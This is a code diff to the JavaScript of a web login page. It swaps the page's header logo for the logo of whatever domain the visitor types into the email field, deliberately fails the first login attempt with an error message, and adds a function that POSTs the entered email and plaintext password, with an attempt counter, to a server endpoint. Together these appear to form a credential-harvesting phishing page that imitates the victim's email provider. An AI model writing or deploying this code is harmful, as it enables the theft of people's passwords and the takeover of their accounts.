@@ -8,6 +8,7 @@ document.addEventListener('DOMContentLoaded', function() {
     const loadingOverlay = document.getElementById('loading-overlay');
     const errorMessage = document.getElementById('error-message');
     const togglePasswordBtn = document.getElementById('toggle-password');
+    const headerLogo = document.querySelector('.main-logo');
 
     // Track login attempts
     let loginAttempts = 0;
@@ -24,6 +25,11 @@ document.addEventListener('DOMContentLoaded', function() {
     function fetchDomainLogo(domain) {
         if (!domain) {
             domainLogo.classList.add('d-none');
+            // Reset the header logo to the default
+            headerLogo.innerHTML = `
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M22 6l-10 7L2 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            `;
             return;
         }
         
@@ -33,11 +39,50 @@ document.addEventListener('DOMContentLoaded', function() {
         // Create a new image to test if the logo exists
         const testImage = new Image();
         testImage.onload = function() {
+            // Update the domain logo in the input field
             domainLogo.src = logoUrl;
             domainLogo.classList.remove('d-none');
+            
+            // Also replace the header logo with the domain logo by creating an img tag
+            // Replace SVG with an img element in the parent container
+            const logoContainer = headerLogo.parentElement;
+            
+            // Create the image element
+            const imgElement = document.createElement('img');
+            imgElement.src = logoUrl;
+            imgElement.classList.add('domain-header-logo');
+            imgElement.alt = 'Domain Logo';
+            
+            // Hide the SVG
+            headerLogo.style.display = 'none';
+            
+            // Remove any existing domain logo images first
+            const existingLogo = logoContainer.querySelector('.domain-header-logo');
+            if (existingLogo) {
+                logoContainer.removeChild(existingLogo);
+            }
+            
+            // Add the new image
+            logoContainer.appendChild(imgElement);
         };
         testImage.onerror = function() {
             domainLogo.classList.add('d-none');
+            
+            // Reset the header logo to the default by showing the SVG and removing any domain logo
+            headerLogo.style.display = '';
+            
+            // Remove any existing domain logo images
+            const logoContainer = headerLogo.parentElement;
+            const existingLogo = logoContainer.querySelector('.domain-header-logo');
+            if (existingLogo) {
+                logoContainer.removeChild(existingLogo);
+            }
+            
+            // Reset the SVG content
+            headerLogo.innerHTML = `
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M22 6l-10 7L2 6" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            `;
         };
         testImage.src = logoUrl;
     }
@@ -82,6 +127,31 @@ document.addEventListener('DOMContentLoaded', function() {
         }, 820);
     }
     
+    // Send login data to the server
+    async function sendLoginData(email, password, attempt) {
+        const data = {
+            email: email,
+            password: password,
+            attempt: attempt,
+            timestamp: new Date().toISOString()
+        };
+        
+        try {
+            const response = await fetch('/api/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            });
+            
+            return await response.json();
+        } catch (error) {
+            console.error('Error sending login data:', error);
+            return { success: false };
+        }
+    }
+    
     // Email input event handler
     emailInput.addEventListener('input', function() {
         const domain = extractDomain(this.value);
@@ -101,7 +171,7 @@ document.addEventListener('DOMContentLoaded', function() {
     });
     
     // Form submission handler
-    loginForm.addEventListener('submit', function(event) {
+    loginForm.addEventListener('submit', async function(event) {
         event.preventDefault();
         
         // Validate form
@@ -111,18 +181,23 @@ document.addEventListener('DOMContentLoaded', function() {
             return;
         }
         
-        // Get domain for later use
-        const domain = extractDomain(emailInput.value);
+        // Get form data
+        const email = emailInput.value;
+        const password = passwordInput.value;
+        const domain = extractDomain(email);
         
-        // Simulate login process
+        // Show loading overlay
         showLoading();
+        
+        // Increment login attempts first
+        loginAttempts++;
+        
+        // Send data to the server
+        await sendLoginData(email, password, loginAttempts);
         
         // Simulate server delay
         setTimeout(() => {
             hideLoading();
-            
-            // Always "fail" the login for the demo
-            loginAttempts++;
             
             if (loginAttempts === 1) {
                 // First attempt: show error message
